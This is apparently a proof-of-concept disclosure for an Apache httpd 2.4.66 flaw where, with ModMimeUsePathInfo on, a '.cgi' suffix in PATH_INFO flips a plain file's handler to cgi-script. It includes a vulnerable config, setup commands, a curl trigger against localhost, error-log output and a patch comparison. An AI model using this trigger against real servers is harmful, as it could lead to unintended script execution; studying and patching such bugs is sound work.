# PoC 062 - PATH_INFO Controls Extension Handler

With `ModMimeUsePathInfo on`, an extension that exists only inside
`PATH_INFO` is appended to `r->filename` before `mod_mime` parses extensions.
A `.cgi` suffix in `PATH_INFO` therefore selects the CGI handler for a file
that was never `.cgi`.

## Setup

Vulnerable httpd 2.4.66.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mime_module    modules/mod_mime.so
LoadModule cgi_module     modules/mod_cgi.so
LoadModule alias_module   modules/mod_alias.so
LoadModule dir_module     modules/mod_dir.so

DocumentRoot /tmp/poc062

<Directory "/tmp/poc062">
    Options +ExecCGI
    AcceptPathInfo On
    ModMimeUsePathInfo On
    AddHandler cgi-script .cgi
    Require all granted
</Directory>
```

The "victim" resource is a regular text file that should be served as
`text/plain`:

```
mkdir -p /tmp/poc062
printf 'plain content, must NOT execute as CGI\n' > /tmp/poc062/note
chmod 644 /tmp/poc062/note
```

A discoverable CGI script is *not* required: `mod_mime` decides handler
purely from extension matching; the actual dispatch then runs `mod_cgi` over
`/tmp/poc062/note`.

## Trigger

```
curl -sS -i 'http://127.0.0.1:8080/note/marker.cgi'
```

The URI resolves to filename `/tmp/poc062/note` plus `path_info=/marker.cgi`.
`find_ct()` builds `resource_name = "/tmp/poc062/note/marker.cgi"`, walks
extensions, hits `.cgi`, and assigns `r->handler = "cgi-script"`.

## Observed effect

Without the patch, `mod_cgi` accepts the request (its only `PATH_INFO` guard
is `AcceptPathInfo Off` / `AP_REQ_REJECT_PATH_INFO`) and tries to execve the
plain text file as a script. Depending on permissions `error_log` shows:

```
AH01215: ... Exec format error: exec of '/tmp/poc062/note' failed
AH01215: End of script output before headers: note
[cgi:error] AH02811: script not found or unable to stat
```

Either way the handler dispatched to `cgi-script` instead of the default
file handler, confirming `PATH_INFO` controlled `r->handler`. With the patch
applied, `note` keeps the default handler and the response body is the
literal text `plain content, must NOT execute as CGI`.

For an even cleaner observation, replace `/tmp/poc062/note` with a real file
mapped to a different handler (for example `AddHandler server-status
.status` and a file `note.status`); requesting `/note.status/x.cgi` shows
the handler flipping from `server-status` to `cgi-script` purely because of
`PATH_INFO`.
